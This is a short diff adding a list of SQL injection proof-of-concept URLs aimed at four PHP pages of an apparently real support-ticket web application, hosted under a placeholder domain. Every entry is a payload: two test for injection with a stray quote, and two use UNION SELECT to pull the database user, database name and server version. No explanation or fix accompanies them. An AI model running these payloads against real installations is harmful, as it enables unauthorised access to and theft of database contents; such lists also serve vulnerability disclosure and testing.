@@ -1,0 +1,13 @@
+report_marketing.php
+http://www.example.com/sit/report_marketing.php?mode=report&exc[0]=1'
+
+tasks.php
+http://www.example.com/sit/tasks.php?selected[]=1'&action=markcomplete
+
+
+
+billable_incidents.php
+http://www.example.com/sit/billable_incidents.php?sites[]=-1 union select 1,concat_ws(':',user(),database())
+
+search.php
+http://www.example.com/sit/search.php?search_string=1' union select 1,version() 
